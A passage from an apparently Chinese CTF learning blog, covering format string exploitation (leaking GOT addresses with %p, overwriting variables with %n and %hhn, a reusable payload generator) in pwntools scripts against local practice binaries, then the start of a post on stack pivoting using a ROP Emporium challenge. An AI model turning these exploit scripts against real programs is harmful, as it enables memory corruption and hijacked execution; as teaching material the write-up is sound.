src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output2.png"></p><p>当然会这个也没有什么用（x</p><h5 id="确定利用的函数"><a href="#确定利用的函数" class="headerlink" title="确定利用的函数"></a>确定利用的函数</h5><p>就像前面说的，我们真正经常用到是把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址，最后根据函数在 libc 中的相对位置，计算出我们需要的函数地址。</p><p>还是用上面的例子，我们输入一个可访问的地址，比如<code>scanf@got</code>，就应该输出scanf对应的地址。</p><p>我们首先使用 <code>read -r test</code> 命令查看其重定向表：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/got.png"></p><blockquote><p>这里之所以没有使用 printf 函数，是因为 scanf 函数会过滤掉一些字符，就像 ‘\x0c’ (‘\f’) 、’’\x07’ (\a’) 、’\x08’ (’\b’) 、’\x20’ (SPACE)等的不可见字符都会被省略。</p></blockquote><p>直接用pwntools写个exp，把获取got表地址写在里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./test&quot;</span>)<br><br>scanf_got = elf.got[<span class="hljs-string">&#x27;scanf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(scanf_got))    <br><br>payload=p32(scanf_got)+<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>gdb.attach(p,<span class="hljs-string">&quot;break printf&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最终的输出和gdb栈结构如下，可以看到我们打印输出的确实是scanf的地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/exp.png"></p><h5 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h5><ul><li>首先确定要泄露的参数的相对偏移</li><li>确定要利用的函数</li><li>进行泄露</li></ul><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>在格式化字符串的多种类型中，有一个神秘的 <code>%n</code>······（x </p><p><strong><code>%n</code> 不输出字符，但是把已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。</strong></p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;Hello Modifier&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br>Hello Modifier<br><span class="hljs-number">15</span>    <span class="hljs-comment">//&#x27;Hello Modifier&#x27;+&quot;%s %n&quot;中间的空格 = 15</span><br></code></pre></td></tr></table></figure><p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数（快去复习一下格式化字符串的格式）。</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%010u%n\n&quot;</span>, <span class="hljs-number">1</span>, &amp;num);  <span class="hljs-comment">//%010u 输出域宽为10的十进制整型数字，不足的位数在左侧用0补齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num is %d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br><span class="hljs-number">0000000001</span><br>num is <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>同理我们可以将一个十六进制的地址进行适当的转换，利用格式化字符串写入内存。</p><p>需要注意的是，我们不能直接转换为一个占位很大的十进制进行编写，如果占位符的长度超出了<code>int</code>类型的范围，这将导致未定义的行为。也就是说这个覆盖不一定会成功，成功与否取决于不同的编译器和不同的平台。</p><p>接下来都用下面的程序进行相应的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><span class="hljs-type">int</span> a=<span class="hljs-number">123</span>,b=<span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c=<span class="hljs-number">789</span>;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;c);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br>    <span class="hljs-built_in">printf</span>(s);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>     &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>无论覆盖什么地址的变量，我们都是构造类似如下的payload:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[padding][overwrite addr]%[overwrite offset]$n<br></code></pre></td></tr></table></figure><p>payload需要写的数据也就是我们要覆盖内存的步骤：</p><ul><li>确定覆盖的地址</li><li>确定要覆盖的变量的相对偏移</li><li>进行覆盖</li></ul><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>在这里我们设计程序直接输出了栈变量C的地址。在实际运用中，我们可以利用其它方法获取相应地址。</p><h5 id="确定相对偏移-1"><a href="#确定相对偏移-1" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>利用上面讲过的简单粗暴的方法进行操作，确定是格式化字符串的第6个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./overflow<br><span class="hljs-number">0xff8f615c</span><br>AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p  <span class="hljs-comment">//这里是我们的输入</span><br>AAAA,<span class="hljs-number">0xff8f60f8</span>,<span class="hljs-number">0xf7f84410</span>,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x1</span>,<span class="hljs-number">0x41414141</span>(在这里！),<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span><br></code></pre></td></tr></table></figure><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>我们已知第六个参数值就是存储变量 c 的地址后，便可以利用%n的特征来修改 c 的值啦！</p><p>根据上面说过的，我们目标输出 <code>modified c.</code>，需要把 c 改为16，则payload 为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[address of c]%012%<span class="hljs-number">6</span>$n  <br></code></pre></td></tr></table></figure><p>最终的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_c=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr_c)<br><br>payload=p32(addr_c)+<span class="hljs-string">b&#x27;%012d&#x27;</span>+<span class="hljs-string">b&#x27;%6$n&#x27;</span>  <br><span class="hljs-comment">#[address of c]%012%6$n   addr of c 的长度为 4，故而我们得再输入12个字符才可以达到16个字符</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(p,&quot;break printf&quot;)</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后运行结果</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show.png"></p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>按照我们上面讲过的payload大致格式，需要在输入内容之前前缀将要覆盖的地址，这个地址将会占用机器字长个字节，也就是说我们能覆盖的最小值就是4字节或者8字节，当我们想要修改变data变量为小于机器字长的数值时该怎么办呢？</p><p>我们可以不把变量的地址放在格式化字符串的前面。我们当时寻找偏移把 tag 放在字符串的最前面是因为这样比较方便直观，如果我们把 tag 放在中间，其实也不影响，如下，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">%p,%p,AAAA,%p,%p,%p,%p,%p,%p        <br><span class="hljs-number">0xffe2c948</span>,<span class="hljs-number">0xf7fa1410</span>,AAAA,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x10</span>,x70257025,<span class="hljs-number">0x41414141</span>,<span class="hljs-number">0x70257025</span><br></code></pre></td></tr></table></figure><p> 同样，我们可以把希望覆盖的的地址写在后面，对应的我们要将%n的参数进行相应的修改。同时我们想要将a覆盖成2，就可以写成下面的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">aa%k$n[padding][addr of a]  <span class="hljs-comment">//padding 用来填充对齐机器字节</span><br></code></pre></td></tr></table></figure><p>最后的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_a=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;aa%8$naa&#x27;</span>+p32(addr_a)  <span class="hljs-comment">#b&#x27;aa%8$naa&#x27;占8字节也就是两个变量的长度，所以地址相应后推两位就是放在第8个变量的位置</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>对应的结果是：<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show2.png"></p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>在前面说过，如果一次性输出大数字个字节来进行覆盖，那么结果成功与否是我们不可控的，我们就需要用别的方式进行覆盖。我们需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数。利用方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> c;<br><span class="hljs-type">short</span> s;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">long</span> l;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hhn\n&quot;</span>, str, &amp;c);       <span class="hljs-comment">// 写入单字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hn\n&quot;</span>, str, &amp;s);        <span class="hljs-comment">// 写入双字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;i);         <span class="hljs-comment">// 写入4字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %ln\n&quot;</span>, str, &amp;l);        <span class="hljs-comment">// 写入8字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %lln\n&quot;</span>, str, &amp;ll);      <span class="hljs-comment">// 写入16字节</span><br></code></pre></td></tr></table></figure><p>我们都知道<strong>在x86中和 x64 的体系结构中，变量以小端序存储</strong>。像题目中所要求的，我们需要将b覆盖为0x12345678，这个<code>0x12345678</code> 在内存中地址从低到高就是 <code>\x78\x56\x34\x12</code>。同时我们利用ida得知b的地址是 0x0804A028。那么我们希望覆盖的方式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure><p>同理payload也要构造为分别赋值的形式，大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p32(<span class="hljs-number">0x0804A028</span>)+p32(<span class="hljs-number">0x0804A029</span>)+p32(<span class="hljs-number">0x0804A02a</span>)+p32(<span class="hljs-number">0x0804A02b</span>)+pad1+<span class="hljs-string">&#x27;%6$n&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$n&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$n&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$n&#x27;</span><br></code></pre></td></tr></table></figure><p>可以靠自己的努力一一计算，也可以使用下方现成的基本构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>):<br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>只需在main函数中调用fmt_str()函数，填充相应变量即可。</p><p>其中每个参数的含义基本如下：</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><p>最终得到exp：（函数构造也要写在exp里的，这里防止啰嗦就不写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn imort *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br><span class="hljs-built_in">print</span> payload<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后结果：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show3.png"></p><hr><p>格式化字符串基础部分over!😎</p><p>格式的Length部分真的是花了我好久才搞明白什么意思，中文网站上都是直译英文，去英文网站用尽毕生英语所学才搞懂😨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不那么菜菜的ROP</title>
    <link href="/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的不那么简单小玩意们</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (堆栈转移)，基本思想是利用已有的内存区域或数据结构（例如堆）来构造一个新的堆栈，然后将程序的控制流转移到该堆栈上执行。通过将堆栈指针 (ESP&#x2F;RSP) 设置为新的堆栈地址，并在该堆栈上构造合适的函数调用帧，可以控制程序的执行路径。</p><p>通常在内存布局受限或某些保护机制存在的情况下使用。</p><p>利用stack pivoting有以下几个特征：</p><ul><li>栈可以控制的空间过小不足以构造完整的rop链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域</li></ul><p>说到底栈迁移就是 <code>&#39;a&#39;*offset+p64(fake_stack)+P64(leave)</code></p><p>首先我们需要了解函数在执行结束后会执行的 <code>leave;ret</code> 这条汇编代码的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, 相当于执行<br>mov esp, ebp<br>pop ebp<br><br># retn, 相当于执行<br>pop eip<br><br>#执行leave指令后，首先绘将ebp的值赋给esp，然后做一个出栈操作，栈指针会向栈底移动一个地址。此时执行ret，就会跳转到新的栈顶指针的地址，即原ebp+8处存储的地址。<br></code></pre></td></tr></table></figure><p>在实际的程序汇编代码中，我们还需要利用如下图所示的代码：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-08-10_15-57-09.png"></p><p><code>rax, [rbp+buf]</code> 我们要知道这句汇编在干嘛，其实就是把 rbp+buf 的地址给到 rax。我们都知道栈溢出是先溢出到 rbp 再到 rip 的，我们可以通过栈溢出的方式控制 rbp 的值，在下面又将会把 rax 的值赋给 rsi ，通过这条汇编命令我们就可以控制 rbp 和 rsi 。</p><p>像上图的例子，假设我们通过溢出控制了 rbp 为 0x123000，那么 read 命令就相当于在执行 <code>read(0,0x123000+buf,xx)</code> ，也就是读入的数据被写入了 0x123000。至此我们就可以实现任意地址的写入。</p><p>但是这样<strong>只适用于我们只利用一次漏洞的情况</strong>，如果我们多次利用漏洞就需要为程序完整的构造一个栈结构，实现 “ 把栈搬走 ” 。</p><p>大致的通用思路就是：</p><ul><li><p>第一次栈迁移修改 rbp 让接下来的输入指向我们想要写的地方</p></li><li><p>第二次栈迁移修改 rsp 让程序正常</p></li><li><p>第三次栈迁移进行攻击 rop 链的构造（例如泄露 libc ，修改 GOT 地址，在栈上布置 shell rop 链）</p></li><li><p>第四次重复第一次的操作</p></li><li><p>第五次构造 getshell rop 链</p></li></ul><blockquote><p>如果需要进行多次 rop 攻击，除了最后一次都需要重复 1、2 操作恢复栈结构</p></blockquote><h4 id="🌰-1："><a href="#🌰-1：" class="headerlink" title="🌰_1："></a>🌰_1：</h4><p>发现了一个靶场：<a href="https://ropemporium.com/">ROP Emporium</a>，选择pivot-x_86</p><p>给的压缩包里还有一个动态链接库 <code>libpivot32.so</code>，checksec 一下甚至出现了没见过的玩意 <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这个  RUNPATH:  ‘.’  的意思是可执行文件的运行时路径（run-time search path）设置为当前目录（’.’），也就是它运行时会使用题目所给的动态链接库</p></blockquote><p>直接在linux里运行一下看看，这个程序有有两个输入。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>反编译一下这个程序的main函数，复制一下源码写个注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//分配一个0x1000000u的内存块，并将其地址赋值给ptr指针</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//检查内存分配是否成功，如果失败则输出错误信息并退出程序。</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//调用pwnme函数，将ptr指针偏移16776960字节的位置作为参数传递给它。</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放先前分配的内存块</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现main函数里没有什么漏洞可以被我们利用，但是在<code>pwnme</code>函数里发现<code>read()</code>没有输入长度的验证</p><p><img 